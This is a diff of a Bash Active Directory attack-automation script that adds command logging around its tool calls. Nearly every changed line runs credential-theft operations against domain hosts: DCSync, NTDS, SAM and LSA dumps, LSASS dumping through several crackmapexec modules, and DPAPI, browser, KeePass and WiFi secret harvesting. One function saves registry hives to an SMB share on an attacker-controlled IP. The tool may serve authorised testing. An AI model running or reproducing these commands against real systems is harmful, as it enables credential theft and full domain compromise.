     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M printnightmare --log ${output_dir}/Vulnerabilities/cme_printnightmare_output_${dc_domain}.txt 2>&1      
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M printnightmare --log ${output_dir}/Vulnerabilities/cme_printnightmare_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1446,7 +1597,9 @@ webdav_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav --log ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M webdav --log ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1457,7 +1610,9 @@ shadowcoerce_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce --log ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M shadowcoerce --log ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1468,7 +1623,9 @@ smbsigning_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --gen-relay-list ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} --gen-relay-list ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     if [ ! -s ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt ]; then
         echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
     fi
@@ -1482,7 +1639,9 @@ ntlmv1_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 --log ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M ntlmv1 --log ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1493,7 +1652,9 @@ runasppl_check () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl --log ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} smb ${servers_smb_list} ${argument_cme[@]} -M runasppl --log ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1507,7 +1668,9 @@ rpcdump_check () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
-            ${impacket_rpcdump} ${argument_imp}@$i 2>&1 > ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt
+            command="${impacket_rpcdump} ${argument_imp}@$i"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 > ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt
             inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
             for prot in $inte_prot; do
                 prot_grep=$(cat ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt | grep -a "$prot")
@@ -1530,7 +1693,9 @@ coercer_check () {
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
-            ${coercer} scan ${argument_coercer} -t ${i} --dc-ip $dc_ip --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.xlsx 2>&1 | tee ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.txt 2>&1
+            command="${coercer} scan ${argument_coercer} -t ${i} --dc-ip $dc_ip --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.xlsx"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1 | tee ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.txt
         done
         if grep -q -r "SMB  Auth" ${output_dir}/Vulnerabilities/Coercer/ 2>/dev/null; then
             echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}"
@@ -1551,10 +1716,14 @@ mssql_enum () {
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
         if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
-            ${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
+            command="${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter \"(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))\" --attrs dNSHostName | grep dNSHostName | cut -d \" \" -f 2 | sort -u  >> ${sql_hostname_list}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            eval "$command"
         fi
         if [ "${nullsess_bool}" == false ]; then
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
+            command="${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} | grep \"MSSQLSvc\" | cut -d \"/\" -f 2 | cut -d \":\" -f 1 | cut -d \" \" -f 1 | sort -u >> ${sql_hostname_list}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            eval "$command"
 
         fi
         for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
@@ -1563,7 +1732,9 @@ mssql_enum () {
         if [ ! -f "${sql_ip_list}" ] ; then
              echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
         else
-            ${crackmapexec} ${cme_verbose} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv --log ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+            command="${crackmapexec} ${cme_verbose} mssql ${target_sql} ${argument_cme[@]} -M mssql_priv --log ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command 2>&1
         fi
     fi
     echo -e ""
@@ -1579,12 +1750,24 @@ juicycreds_dump () {
     smb_scan
     for i in $(/bin/cat ${servers_smb_list}); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
+        command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
     done
     echo -e ""
 }
@@ -1597,7 +1780,9 @@ msol_dump () {
         echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
         read -p ">> " target_msol </dev/tty
     done
-    ${crackmapexec} ${cme_verbose} smb ${target_msol} "${argument_cme[@]}" -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt
+    command="${crackmapexec} ${cme_verbose} smb ${target_msol} ${argument_cme[@]} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command
     echo -e ""
 }
 
@@ -1609,13 +1794,17 @@ veeam_dump () {
         echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
         read -p ">> " target_veeam </dev/tty
     done
-    ${crackmapexec} ${cme_verbose} smb ${target_veeam} "${argument_cme[@]}" -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt
+    command="${crackmapexec} ${cme_verbose} smb ${target_veeam} ${argument_cme[@]} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command
     echo -e ""
 }
 
 laps_dump () {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" --log ${output_dir}/Credentials/laps_dump_${dc_domain}.txt 2>&1
+    command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} -M laps --kdcHost ${kdc}.${dc_domain} --log ${output_dir}/Credentials/laps_dump_${dc_domain}.txt"
+    echo "$(date +%Y-%m-%d); $command" >> $command_log
+    $command 2>&1
     echo -e ""
 }
 
@@ -1624,7 +1813,9 @@ gmsa_dump () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" --gmsa --log ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} --gmsa --log ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
     fi
     echo -e ""
 }
@@ -1637,7 +1828,9 @@ secrets_dump_dcsync () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
         else
-            ${impacket_secretsdump} ${argument_imp}@${target} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
+            command="${impacket_secretsdump} ${argument_imp}@${target} -just-dc"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1654,7 +1847,9 @@ secrets_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
-                ${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
+                command="${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1676,7 +1871,9 @@ samsystem_dump () {
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p ${output_dir}/Credentials/SAMDump/${i}
-                ${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o "\\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
+                command="${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o \"\\\\$attacker_IP\\lwpshare\\SAMDump\\$i\""
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1688,7 +1885,9 @@ ntds_dump () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
     else
-        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt
+        command="${crackmapexec} ${cme_verbose} smb ${target} ${argument_cme[@]} --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt"
+        echo "$(date +%Y-%m-%d); $command" >> $command_log
+        $command
         #${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" -M ntdsutil --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt
     fi
     echo -e ""
@@ -1706,7 +1905,9 @@ sam_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1724,7 +1925,9 @@ lsa_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1742,7 +1945,9 @@ lsassy_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1760,7 +1965,9 @@ handlekatz_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1778,7 +1985,9 @@ procdump_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1796,7 +2005,9 @@ nanodump_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1814,8 +2025,12 @@ dpapi_dump () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using crackmapexec ${NC}"
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --dpapi "cookies" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt
-            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --dpapi "password" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi \"cookies\" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
+            command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} --dpapi \"password\" --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         done
     fi
     echo -e ""
@@ -1834,7 +2049,9 @@ donpapi_dump () {
             cd ${output_dir}/Credentials
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
-                ${donpapi} ${argument_donpapi}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
+                command="${donpapi} ${argument_donpapi}@${i} -dc-ip ${dc_ip}"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
             done
             cd ${current_dir}
         fi
@@ -1852,7 +2069,9 @@ hekatomb_dump () {
         else
             current_dir=$(pwd)
             cd ${output_dir}/Credentials
-            ${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
+            command="${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
             cd ${current_dir} 
         fi
     fi
@@ -1865,7 +2084,9 @@ masky_dump () {
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
-            ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M adcs --kdcHost "${kdc}.${dc_domain}" > ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+            command="${crackmapexec} ${cme_verbose} ldap ${target} ${argument_cme[@]} ${ldaps_param} -M adcs --kdcHost ${kdc}.${dc_domain}"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command > ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt
         fi
         pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4| cut -d " " -f 2 | head -n 1)
         pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | head -n 1)
@@ -1877,7 +2098,9 @@ masky_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
+                command="${crackmapexec} ${cme_verbose} smb ${i} ${argument_cme[@]} -M masky -o \"CA= ${pki_server}\\${pki_ca}\" --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt"
+                echo "$(date +%Y-%m-%d); $command" >> $command_log
+                $command
             done
         else
             echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
@@ -1896,7 +2119,9 @@ certsync_ntds_dump () {
             echo -e "${PURPLE}[-] certsync requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-            ${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt
+            command="${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
+            echo "$(date +%Y-%m-%d); $command" >> $command_log
+            $command
         fi
     fi
     echo -e ""
@@ -2055,6 +2280,7 @@ set_attackerIP(){
         echo -e "${YELLOW}[i]${NC} Attacker IPs: $attacker_IPlist${NC}"
         read -p ">> " attacker_IP </dev/tty
     done
+    export attacker_IP="$attacker_IP"
 }
 
 ad_menu () {
